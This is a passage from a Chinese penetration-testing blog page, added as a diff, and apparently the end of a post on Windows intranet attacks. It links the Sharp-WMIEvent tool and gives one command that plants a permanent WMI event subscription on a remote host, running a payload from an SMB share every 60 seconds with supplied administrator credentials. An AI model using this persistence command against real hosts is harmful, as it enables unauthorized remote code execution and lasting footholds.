+<p><a href="https://github.com/wh0Nsq/Sharp-WMIEvent"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/wh0Nsq/Sharp-WMIEvent</a></p>
+<p>在远程主机上部署一个随即命名的永久事件订阅，并每隔60s执行以此SMB共享中的攻击载荷</p>
+<pre tabindex="0"><code>Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 192.168.1.131 -Domain uf9n1x.com -Username Administrator -Password 123qwe@</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="Tags - 内网渗透">内网渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/59/" class="post-nav-item" rel="prev" title="Windows经典漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Windows经典漏洞</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/" class="post-nav-item" rel="next" title="Windows权限提升">Windows权限提升<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
